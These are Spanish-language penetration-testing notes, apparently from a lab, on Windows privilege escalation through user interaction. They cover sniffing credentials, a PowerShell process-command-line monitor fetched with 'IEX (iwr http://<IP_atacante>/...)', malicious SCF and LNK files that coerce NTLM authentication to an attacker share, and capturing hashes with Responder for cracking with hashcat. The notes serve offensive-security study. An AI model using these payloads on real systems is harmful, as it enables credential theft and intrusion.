# Windows Privilege Escalation – Interacting with Users

Los usuarios pueden ser aprovechados como vector de escalada de privilegios. Estas técnicas implican manipular su interacción con el sistema para obtener credenciales o hashes.

---

## 1. Captura de tráfico (Traffic Capture)

### Descripción
Si Wireshark o Npcap están instalados y mal configurados, es posible capturar tráfico en la máquina y robar credenciales en texto claro o hashes NTLM.

### Pasos

1. **Verificar instalación:**
   - Revisar si existe Wireshark/Npcap en `C:\Program Files\Wireshark\`.

2. **Capturar tráfico en la máquina comprometida:**
   ```powershell
   wireshark
   ```
   - Filtrar por protocolos: `ftp`, `http`, `smtp`.

3. **Analizar credenciales:**
   Ejemplo de tráfico FTP:
   ```text
   USER root
   PASS FTP_adm1n!
   ```

4. **Alternativa desde máquina atacante:**
   - Capturar con `tcpdump` o Wireshark.
   - Extraer credenciales automáticamente:
     ```bash
     sudo python3 net-creds.py -i eth0
     # o
     sudo python3 net-creds.py -p captura.pcap
     ```

---

## 2. Monitoreo de líneas de comandos de procesos

### Descripción
Detectar credenciales pasadas como argumentos en procesos (`net use`, tareas programadas).

### Pasos

1. **Script en PowerShell para monitorear:**
   ```powershell
   while($true) {
     $process = Get-WmiObject Win32_Process | Select-Object CommandLine
     Start-Sleep 1
     $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
     Compare-Object -ReferenceObject $process -DifferenceObject $process2
   }
   ```

2. **Ejecutar desde máquina víctima (cargado desde atacante):**
   ```powershell
   IEX (iwr 'http://<IP_atacante>/procmon.ps1')
   ```

3. **Ejemplo encontrado:**
   ```text
   net use T: \\sql02\backups /user:dominio\sqlsvc My4dm1nP@s5w0Rd
   ```

4. **Usar credenciales descubiertas:**
   ```powershell
   net use T: \\sql02\backups /user:dominio\sqlsvc My4dm1nP@s5w0Rd
   ```

---

# Archivos Maliciosos SCF y LNK - Guía Técnica

## 3. SCF malicioso en shares

### Descripción

Archivos `.scf` (Shell Command Files) manipulados que provocan autenticación SMB automática cuando un usuario accede a la carpeta que los contiene.

### Pasos de implementación

**1. Crear archivo malicioso:**

Guardar el siguiente contenido como `@Inventory.scf`:

```ini
[Shell]
Command=2
IconFile=\\<IP_atacante>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

**2. Colocarlo en share accesible** donde los usuarios naveguen regularmente.

**3. Ejecutar Responder para capturar hashes:**

```bash
sudo responder -wrf -v -I tun0
```
NOTA: En el ejercicio parámetro -r ni -f existían, al quitarlos funcionó.
**4. Crackear hash capturado con Hashcat:**

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

NOTA: el archivo hash.txt seria algo como: ``` 
```txt
sccm_svc::WINLPE-SRV01:9634521057ed3072:3869F1DED1F035B691D2FD9233FB36F1:010100000000000000C783F15701DC016F7BFB563A21FD030000000002000800430046004B00330001001E00570049004E002D004A00420052004B00560042004E005A0048003100450004003400570049004E002D004A00420052004B00560042004E005A004800310045002E00430046004B0033002E004C004F00430041004C0003001400430046004B0033002E004C004F00430041004C0005001400430046004B0033002E004C004F00430041004C000700080000C783F15701DC0106000400020000000800300030000000000000000100000000200000B5335531FD1341EF2C8CD66071815C87F6C3A4D97965C084C56B3FA562CD82390A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003500000000000000000000000000
```


## 4. Archivos .lnk maliciosos (Server 2019+)

### Descripción

Alternativa a los archivos SCF cuando estos ya no funcionan en Windows Server 2019 y versiones posteriores. Los archivos `.lnk` (Link/Shortcut) mantienen la capacidad de forzar autenticación SMB.

### Pasos de implementación

**1. Generar archivo .lnk malicioso con PowerShell:**

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<IP_atacante>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browse to trigger auth request"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

**2. Colocar el archivo .lnk** en un share frecuentemente usado por usuarios.

**3. Capturar hashes** utilizando Responder o Inveigh.

---

## Notas técnicas sobre monitoreo de procesos

### Información capturada por el script

**Ejecutables y rutas completas:**

```
C:\Windows\System32\cmd.exe
C:\Tools\backup.exe
```

**Parámetros de línea de comandos (posibles credenciales):**

```
net use T: \\sql02\backups /user:dominio\sqlsvc My4dm1nP@s5w0Rd
sqlcmd -S sql01 -U sa -P Sup3rS3cret
```

**Procesos temporales y tareas programadas:**

```
C:\Windows\System32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
```

### Por qué es útil

- Captura contraseñas en texto claro directamente de comandos
- Detecta actividad sensible (backups, conexiones SQL, montajes de red)
- Identifica software interno para posibles vectores de ataque adicionales
- Monitorea procesos que pueden ejecutarse brevemente

### Limitaciones

- **No captura entrada interactiva:** No muestra lo que el usuario escribe dentro de aplicaciones
- **Solo parámetros CLI:** Limitado a argumentos de línea de comandos, no datos en memoria
- **Requiere ejecución continua:** Debe mantenerse activo para no perder procesos de corta duración